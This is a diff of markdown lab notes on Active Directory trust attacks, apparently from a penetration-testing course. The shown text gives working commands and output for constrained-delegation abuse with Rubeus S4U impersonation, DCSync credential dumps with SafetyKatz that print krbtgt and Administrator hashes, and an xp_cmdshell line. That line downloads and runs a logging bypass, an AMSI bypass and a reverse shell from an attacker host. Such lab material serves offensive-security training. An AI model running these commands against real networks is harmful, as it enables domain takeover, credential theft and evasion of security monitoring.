@@ -1,6 +1,6 @@
 # AD Trust Attacks
 
-## Intra-Forest Unconstrained Delegation Abuse
+## Intra-Forest Unconstrained Delegation & Printer Bug Abuse & DCSync Attack
 
 ### Lab: Hands-On #18
 
@@ -250,7 +250,200 @@ Credentials:
 ---
 ---
 
-## Intra-Forest Azure AD Connect Abuse
+## Intra-Forest Constrained Delegation Abuse & DCSync Attack
+
+### Lab: Hands-On #23
+
+#### Tasks
+
+- Enumerate users in the `eu.local` domain for whom Constrained Delegation is enabled
+- Abuse the Delegation to execute DCSync attack against `eu.local`
+
+#### Attack Path Steps
+
+1. Enumerate user accounts in `eu.local` with Constrained Delegation enabled 
+2. Identify `storagesvc` as a user with delegation rights on the Domain Controller `eu-dc`
+3. Reuse the previously obtained password of `storagesvc` to compute its NTLM hash
+4. Perform an S4U2Self + S4U2Proxy attack to impersonate `Administrator` and request a service ticket for LDAP on `eu-dc`
+5. Use the impersonated ticket to perform a DCSync attack against `eu.local` and extract sensitive credentials
+
+#### Solution
+
+- Enumerate users in the `eu.local` domain for whom Constrained Delegation is enabled
+
+```
+C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+[SNIP]
+
+PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+
+PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+```
+
+```
+PS C:\AD\Tools> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
+
+DistinguishedName           : CN=storagesvc,CN=Users,DC=eu,DC=local
+msDS-AllowedToDelegateTo 📌 : {time/EU-DC.eu.local/eu.local, time/EU-DC.eu.local, time/EU-DC, time/EU-DC.eu.local/EU...} 📌
+Name                        : storagesvc 👤
+ObjectClass                 : user
+ObjectGUID                  : 041fedb0-a442-4cdf-af34-6559480a2d74
+```
+
+Now, to be able to abuse Constrained Delegation that `storagesvc` user has on `eu-dc` we need either password or NTLM hash of it.
+
+In a previous hands-on (#22) we already cracked `storagesvc`'s password in cleartext using Kerberos.
+
+Use the below commands from the student VM.
+
+```
+C:\Users\studentuser51> echo %Pwn%
+
+hash
+
+C:\Users\studentuser51> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /password:Qwerty@123 /user:storagesvc /domain:eu.local
+
+[SNIP]
+
+[*] Action: Calculate Password Hash(es)
+
+[SNIP]
+
+[*] Input password             : Qwerty@123 🔑
+[*] Input username             : storagesvc 👤
+[*] Input domain               : eu.local
+[*] Salt                       : EU.LOCALstoragesvc
+[*]       rc4_hmac             : 5C76877A9C454CDED58807C20C20AEAC 🔑
+[*]       aes128_cts_hmac_sha1 : 4A5DDDB19CD631AEE9971FB40A8195B8
+[*]       aes256_cts_hmac_sha1 : 4A0D89D845868AE3DCAB270FE23BEDD442A62C4CAD7034E4C60BEDA3C0F65E04
+[*]       des_cbc_md5          : 7F7C6ED00258DC57
+```
+
+Now we have the NTLM key of `storagesvc`.
+
+Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that.
+
+```
+C:\Windows\system32> echo %Pwn%
+
+s4u
+
+C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
+
+[SNIP]
+
+[*] Action: S4U 🎟️
+
+[SNIP]
+
+[*] Impersonating user 'Administrator' 🎭 to target SPN 'nmagent/eu-dc.eu.local'
+[*] Final ticket will be for the alternate service 'ldap' 📌
+
+[SNIP]
+```
+
+Check the ticket.
+
+```
+C:\Windows\system32> klist
+
+[SNIP]
+
+Cached Tickets: (1) 🎟️
+
+#0>     Client: Administrator 🎭 @ EU.LOCAL
+        Server: ldap 📌/eu-dc.eu.local @ EU.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 4/27/2025 14:20:08 (local)
+        End Time:   4/28/2025 0:20:08 (local)
+        Renew Time: 5/4/2025 14:20:08 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+```
+
+Note that we requested an alternate ticket for the LDAP service.
+
+- Abuse the Delegation to execute DCSync attack against `eu.local`
+
+Since we are impersonating the domain administrator of `eu.local` by abusing constrained delegation, we should now be able to run the DCSync attack against `eu.local`.
+
+```
+C:\Windows\system32> echo %Pwn%
+
+lsadump::dcsync
+
+C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:eu\krbtgt /domain:eu.local" "exit"
+
+[SNIP]
+
+mimikatz(commandline) # lsadump::dcsync /user:eu\krbtgt /domain:eu.local
+
+[SNIP]
+
+SAM Username         : krbtgt 👤
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/12/2019 11:00:04 PM
+Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 83ac1bab3e98ce6ed70c9d5841341538 🔑
+    ntlm- 0: 83ac1bab3e98ce6ed70c9d5841341538
+    lm  - 0: bcb73c3d2b4005e405ff7399f3ca2bf0
+
+[SNIP]
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EU.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d 🔑
+
+[SNIP]
+```
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:eu\administrator /domain:eu.local" "exit"
+
+[SNIP]
+
+mimikatz(commandline) # lsadump::dcsync /user:eu\administrator /domain:eu.local
+
+[SNIP]
+
+SAM Username         : Administrator 👤
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 7/12/2019 10:57:59 PM
+Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-500
+Object Relative ID   : 500
+
+[SNIP]
+
+Credentials:
+  Hash NTLM: fe422f818eb7e9c6de5862d94739c2e4 🔑
+
+[SNIP]
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EU-DCAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d 🔑
+
+[SNIP]
+```
+
+---
+---
+
+## Intra-Forest Azure AD Connect Abuse & DCSync Attack
 
 ### Lab: Hands-On #19
 
@@ -292,7 +485,7 @@ Credentials:
 
 - Find out the machine where Azure AD Connect is installed
 
-We can find out the machine where Azure AD Connect is installed by looking at the Description of special account whose name begins with 'MSOL_'.
+⭐ We can find out the machine where Azure AD Connect is installed by looking at the Description of special account whose name begins with 'MSOL_'.
 
 ```
 C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
@@ -589,7 +782,7 @@ C:\Users\Administrator>
 C:\Users\Administrator> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.51
 ```
 
-Note that we are looking for the `[In]` key for `us.techcorp.local` to `techcrop.local` trust.
+⚠️ Note that we are looking for the `[In]` key for `us.techcorp.local` to `techcrop.local` trust.
 
 ```
 C:\Users\Administrator> echo %Pwn%
@@ -941,200 +1134,7 @@ Qwerty@123 🔑    (?)
 ---
 ---
 
-## Cross-Forest Constrained Delegation Abuse
-
-### Lab: Hands-On #23
-
-#### Tasks
-
-- Enumerate users in the `eu.local` domain for whom Constrained Delegation is enabled
-- Abuse the Delegation to execute DCSync attack against `eu.local`
-
-#### Attack Path Steps
-
-1. Enumerate user accounts in `eu.local` with Constrained Delegation enabled 
-2. Identify `storagesvc` as a user with delegation rights on the Domain Controller `eu-dc`
-3. Reuse the previously obtained password of `storagesvc` to compute its NTLM hash
-4. Perform an S4U2Self + S4U2Proxy attack to impersonate `Administrator` and request a service ticket for LDAP on `eu-dc`
-5. Use the impersonated ticket to perform a DCSync attack against `eu.local` and extract sensitive credentials
-
-#### Solution
-
-- Enumerate users in the `eu.local` domain for whom Constrained Delegation is enabled
-
-```
-C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
-
-[SNIP]
-
-PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
-
-PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
-```
-
-```
-PS C:\AD\Tools> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
-
-DistinguishedName           : CN=storagesvc,CN=Users,DC=eu,DC=local
-msDS-AllowedToDelegateTo 📌 : {time/EU-DC.eu.local/eu.local, time/EU-DC.eu.local, time/EU-DC, time/EU-DC.eu.local/EU...} 📌
-Name                        : storagesvc 👤
-ObjectClass                 : user
-ObjectGUID                  : 041fedb0-a442-4cdf-af34-6559480a2d74
-```
-
-Now, to be able to abuse Constrained Delegation that `storagesvc` user has on `eu-dc` we need either password or NTLM hash of it.
-
-In a previous hands-on (#22) we already cracked `storagesvc`'s password in cleartext using Kerberos.
-
-Use the below commands from the student VM.
-
-```
-C:\Users\studentuser51> echo %Pwn%
-
-hash
-
-C:\Users\studentuser51> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /password:Qwerty@123 /user:storagesvc /domain:eu.local
-
-[SNIP]
-
-[*] Action: Calculate Password Hash(es)
-
-[SNIP]
-
-[*] Input password             : Qwerty@123 🔑
-[*] Input username             : storagesvc 👤
-[*] Input domain               : eu.local
-[*] Salt                       : EU.LOCALstoragesvc
-[*]       rc4_hmac             : 5C76877A9C454CDED58807C20C20AEAC 🔑
-[*]       aes128_cts_hmac_sha1 : 4A5DDDB19CD631AEE9971FB40A8195B8
-[*]       aes256_cts_hmac_sha1 : 4A0D89D845868AE3DCAB270FE23BEDD442A62C4CAD7034E4C60BEDA3C0F65E04
-[*]       des_cbc_md5          : 7F7C6ED00258DC57
-```
-
-Now we have the NTLM key of `storagesvc`.
-
-Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that.
-
-```
-C:\Windows\system32> echo %Pwn%
-
-s4u
-
-C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
-
-[SNIP]
-
-[*] Action: S4U 🎟️
-
-[SNIP]
-
-[*] Impersonating user 'Administrator' 🎭 to target SPN 'nmagent/eu-dc.eu.local'
-[*] Final ticket will be for the alternate service 'ldap' 📌
-
-[SNIP]
-```
-
-Check the ticket.
-
-```
-C:\Windows\system32> klist
-
-[SNIP]
-
-Cached Tickets: (1) 🎟️
-
-#0>     Client: Administrator 🎭 @ EU.LOCAL
-        Server: ldap 📌/eu-dc.eu.local @ EU.LOCAL
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
-        Start Time: 4/27/2025 14:20:08 (local)
-        End Time:   4/28/2025 0:20:08 (local)
-        Renew Time: 5/4/2025 14:20:08 (local)
-        Session Key Type: AES-128-CTS-HMAC-SHA1-96
-        Cache Flags: 0
-        Kdc Called:
-```
-
-Note that we requested an alternate ticket for the LDAP service.
-
-- Abuse the Delegation to execute DCSync attack against `eu.local`
-
-Since we are impersonating the domain administrator of `eu.local` by abusing constrained delegation, we should now be able to run the DCSync attack against `eu.local`.
-
-```
-C:\Windows\system32> echo %Pwn%
-
-lsadump::dcsync
-
-C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:eu\krbtgt /domain:eu.local" "exit"
-
-[SNIP]
-
-mimikatz(commandline) # lsadump::dcsync /user:eu\krbtgt /domain:eu.local
-
-[SNIP]
-
-SAM Username         : krbtgt 👤
-Account Type         : 30000000 ( USER_OBJECT )
-User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
-Account expiration   :
-Password last change : 7/12/2019 11:00:04 PM
-Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-502
-Object Relative ID   : 502
-
-Credentials:
-  Hash NTLM: 83ac1bab3e98ce6ed70c9d5841341538 🔑
-    ntlm- 0: 83ac1bab3e98ce6ed70c9d5841341538
-    lm  - 0: bcb73c3d2b4005e405ff7399f3ca2bf0
-
-[SNIP]
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : EU.LOCALkrbtgt
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d 🔑
-
-[SNIP]
-```
-
-```
-C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:eu\administrator /domain:eu.local" "exit"
-
-[SNIP]
-
-mimikatz(commandline) # lsadump::dcsync /user:eu\administrator /domain:eu.local
-
-[SNIP]
-
-SAM Username         : Administrator 👤
-Account Type         : 30000000 ( USER_OBJECT )
-User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
-Account expiration   :
-Password last change : 7/12/2019 10:57:59 PM
-Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-500
-Object Relative ID   : 500
-
-[SNIP]
-
-Credentials:
-  Hash NTLM: fe422f818eb7e9c6de5862d94739c2e4 🔑
-
-[SNIP]
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : EU-DCAdministrator
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d 🔑
-
-[SNIP]
-```
-
----
----
-
-## Cross-Forest Unconstrained Delegation Abuse
+## Cross-Forest Unconstrained Delegation & Printer Bug Abuse & DCSync Attack
 
 ### Lab: Hands-On #24
 
@@ -1149,7 +1149,6 @@ Credentials:
 3. Trigger an authentication from the `usvendor-dc.usvendor.local` to `us-web` exploiting the Printer Bug
 4. Capture the TGT of the domain controller machine account `USVENDOR-DC$` via Unconstrained Delegation on `us-web`
 5. Inject the captured ticket and perform a DCSync attack against `usvendor.local`
-
 
 #### Solution
 
@@ -1739,7 +1738,7 @@ EUVENDOR\euadmins 👥                 Group            S-1-5-21-4066061358-3942
 
 - Get a reverse shell on a `db-sqlsrv` in `db.local` forest by abusing database links from `us-mssql`
 
-Let's first enumerate database links on all the SQL servers, we just need public access on for that.
+⭐ Let's first enumerate database links on all the SQL servers, we just need public access on for that.
 Let's see if `studentuser51` has that access on any database in the domain. We will use PowerUpSQL for this.
 
 ```
@@ -1811,7 +1810,7 @@ So, there is a database link to a SQL server from `us-mssql` server.
 
 **HeidiSQL**
 
-Using HeidiSQL client, let's login to `us-mssql` using windows authentication of `studentuser51`. Once logged-in, use openquery to enumerate linked databases.
+Using HeidiSQL client, let's login to `us-mssql` using Windows authentication of `studentuser51`. Once logged-in, use openquery to enumerate linked databases.
 
 ```sql
 select * from master..sysservers
@@ -1862,7 +1861,7 @@ Links       :
 
 So, we do have database links to other SQL Servers.
 
-If `xp_cmdshell` is enabled (or RPC Out is true that allows us to enable `xp_cmdshell`), it is possible to execute commands on any node in the database links using the below commands.
+⭐ If `xp_cmdshell` is enabled (or RPC Out is true that allows us to enable `xp_cmdshell`), it is possible to execute commands on any node in the database links using the below commands.
 
 Try to execute a command on each node where `xp_cmdshell` is enabled.
 
@@ -1923,7 +1922,7 @@ PS C:\Users\studentuser51> notepad C:\AD\Tools\Invoke-PowerShellTcpEx.ps1
 reverse -Reverse -IPAddress 192.168.100.51 -Port 443
 ```
 
-Note that in the below command, we first run an ScriptBlock logging bypass, then an AMSI bypass and finally, the reverse shell.
+⚠️ Note that in the below command, we first run an ScriptBlock logging bypass, then an AMSI bypass and finally, the reverse shell.
 
 ```
 PS C:\Users\studentuser51> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.51/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.51/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.51/Invoke-PowerShellTcpEx.ps1)"'''
@@ -2004,7 +2003,7 @@ Instance    : DB-SQLSRV 🖥️
 CustomQuery : {db\srvdba, } 📌
 Sysadmin    : 1
 Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
-User        : sa
+User        : sa 📌
 Links       :
 ```
 
@@ -2066,7 +2065,7 @@ DB-SQLSRV 🖥️
 ---
 ---
 
-## Cross-Forest Foreign Security Principals & ACLs Abuse
+## Cross-Forest Foreign Security Principal & ACL Abuse
 
 ### Lab: Hands-On #27
 
@@ -2269,7 +2268,9 @@ DB-DC 🖥️
 1. Access `bastion-dc` as local administrator
 2. Check if PAM trust is enabled: first enumerate trusts on `bastion.local`, then enumerate trusts on `production.local` to be sure of PAM trust in use
 3. Check the membership of Shadow Security Principals on `bastion.local`
-4. 
+4. Identify that `Administrator@bastion.local` is mapped to the `Enterprise Admins` group in `production.local` through Shadow Principals
+5. Use the NTLM hash of `Administrator@bastion.local` to perform OverPass-the-Hash and obtain a TGT for `production.local`
+6. Establish a PowerShell Remoting session to the DC in `production.local` as `Enterprise Admin`
 
 #### Solution
 
@@ -2764,7 +2765,7 @@ NTLM    : f29207796c9e6829aa1882b7cccfa36d
 [SNIP]
 ```
 
-Attempting access using winrs isn't possible for native cmd execution to leverage the Loader and `argsplit.bat` method, we can instead create a PSRemote session using `-Authentication NegotiateWithImplicitCredential` and leverage `Invoke-Mimi.ps1` to dump trust keys remotely.
+Attempting access using winrs isn't possible for native cmd execution to leverage the Loader and `ArgSplit.bat` method, we can instead create a PSRemote session using `-Authentication NegotiateWithImplicitCredential` and leverage `Invoke-Mimi.ps1` to dump trust keys remotely.
 
 Begin by creating a PSRemote session as before.
 
